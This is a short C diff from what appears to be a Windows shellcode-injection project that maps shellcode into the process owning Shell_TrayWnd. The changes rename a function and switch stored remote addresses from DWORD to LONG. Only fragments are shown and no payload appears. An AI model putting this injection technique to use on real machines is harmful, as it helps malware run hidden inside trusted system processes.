@@ -3,7 +3,7 @@
 #include <stdio.h>
 
 //for injection into Shell_TrayWnd
-PVOID map_code_with_addresses_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeSize)
+PVOID map_code_and_addresses_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeSize)
 {
     HANDLE hSection = NULL;
     OBJECT_ATTRIBUTES hAttributes;
@@ -52,11 +52,11 @@ PVOID map_code_with_addresses_into_process(HANDLE hProcess, LPBYTE shellcode, SI
 
     //store the remote addresses
     PVOID buf_va = (BYTE*) handles_remote_ptr;
-    DWORD hop1 = (DWORD) buf_va + sizeof(DWORD);
-    DWORD shellc_va = (DWORD) shellcode_remote_ptr;
+    LONG hop1 = (LONG) buf_va + sizeof(LONG);
+    LONG shellc_va = (LONG) shellcode_remote_ptr;
 
-    memcpy((BYTE*)handles_local_ptr, &hop1, sizeof(DWORD));
-    memcpy((BYTE*)handles_local_ptr  + sizeof(DWORD), &shellc_va, sizeof(DWORD));
+    memcpy((BYTE*)handles_local_ptr, &hop1, sizeof(LONG));
+    memcpy((BYTE*)handles_local_ptr + sizeof(LONG), &shellc_va, sizeof(LONG));
 
     //unmap from the context of current process
     ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
@@ -83,7 +83,7 @@ bool inject_into_tray(LPBYTE shellcode, SIZE_T shellcodeSize)
         return false;
     }
 
-    LPVOID remote_shellcode_ptr = map_code_with_addresses_into_process(hProcess, shellcode, shellcodeSize);
+    LPVOID remote_shellcode_ptr = map_code_and_addresses_into_process(hProcess, shellcode, shellcodeSize);
     if (remote_shellcode_ptr == NULL) {
         return false;
     }
